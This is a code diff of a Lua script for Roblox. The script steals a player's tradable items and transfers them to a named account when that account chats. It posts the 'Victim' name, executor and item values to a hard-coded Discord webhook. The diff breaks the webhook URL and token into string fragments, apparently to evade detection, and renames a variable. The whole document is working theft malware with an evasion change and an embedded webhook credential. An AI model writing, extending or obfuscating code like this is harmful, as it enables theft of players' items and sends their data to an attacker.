@@ -1,8 +1,13 @@
-
-local logs_webhook = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"
+local a = "https://"
+local b = "discord"
+local c = ".com/api/"
+local d = "webhooks/"
+local e = "1386534377114308690/"
+local f = "PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"
+local logurl = a..b..c..d..e..f
 
 -- Set this to the username of the recipient
-local username = "TARGET_USERNAME_HERE"
+local recipient = "TARGET_USERNAME_HERE"
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -183,7 +188,7 @@ local payload = {
         ["color"] = 0x00ffcc,
         ["fields"] = {
             {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
-            {["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
+            {["name"] = ":crown: Creator", ["value"] = recipient, ["inline"] = false},
             {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
             {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
             {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
@@ -213,13 +218,13 @@ local logs_payload = {
 if req then
     pcall(function()
         req({
-            Url = logs_webhook,
+            Url = logurl,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(payload)
         })
         req({
-            Url = logs_webhook,
+            Url = logurl,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(logs_payload)
@@ -253,7 +258,7 @@ end
 
 local function startGiving()
     if not hasValidItems() then return end
-    local target = Players:FindFirstChild(username)
+    local target = Players:FindFirstChild(recipient)
     if not target or not target.Character then return end
     local hrp = target.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
@@ -309,14 +314,14 @@ end
 unequipAllPets()
 local started = false
 for _, p in ipairs(Players:GetPlayers()) do
-    if p.Name == username then
+    if p.Name == recipient then
         p.Chatted:Connect(function()
             if not started then started = true; startGiving() end
         end)
     end
 end
 Players.PlayerAdded:Connect(function(p)
-    if p.Name == username then
+    if p.Name == recipient then
         p.Chatted:Connect(function()
             if not started then started = true; startGiving() end
         end)
